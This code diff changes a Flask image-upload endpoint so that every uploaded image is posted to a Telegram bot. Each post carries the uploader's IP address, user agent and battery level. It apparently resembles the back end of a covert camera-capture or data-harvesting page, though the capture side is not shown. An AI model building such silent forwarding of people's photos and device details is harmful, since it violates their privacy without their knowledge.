@@ -3,6 +3,7 @@ import base64
 import re
 import os
 from datetime import datetime
+import requests
 
 app = Flask(__name__, static_url_path='/static')
 
@@ -10,11 +11,25 @@ app = Flask(__name__, static_url_path='/static')
 if not os.path.exists('static'):
     os.makedirs('static')
 
+# Telegram Bot API details
+TELEGRAM_BOT_TOKEN = 'your_bot_token_here'
+TELEGRAM_CHAT_ID = 'your_chat_id_here'
+
+# Function to send photo to Telegram
+def send_photo_to_telegram(photo_path, ip, user_agent, battery):
+    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
+    files = {'photo': open(photo_path, 'rb')}
+    caption = f"IP: {ip}\nUser Agent: {user_agent}\nBattery: {battery}%"
+    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
+    response = requests.post(url, files=files, data=data)
+    return response.json()
+
 # Endpoint to handle image upload
 @app.route('/upload', methods=['POST'])
 def upload_image():
     data = request.get_json()
     image_data = data['image']
+    battery = data['battery']
     # Remove the data:image/png;base64, part
     image_data = re.sub('^data:image/.+;base64,', '', image_data)
     # Decode the image data
@@ -25,7 +40,14 @@ def upload_image():
     with open(filename, 'wb') as f:
         f.write(image_data)
 
-    return jsonify({'message': 'Image uploaded successfully', 'filename': filename})
+    # Get IP and User Agent
+    ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent')
+
+    # Send the image and information to Telegram
+    send_photo_to_telegram(filename, ip, user_agent, battery)
+
+    return jsonify({'message': 'Image uploaded and sent to Telegram successfully', 'filename': filename})
 
 # Serve the main page
 @app.route('/')
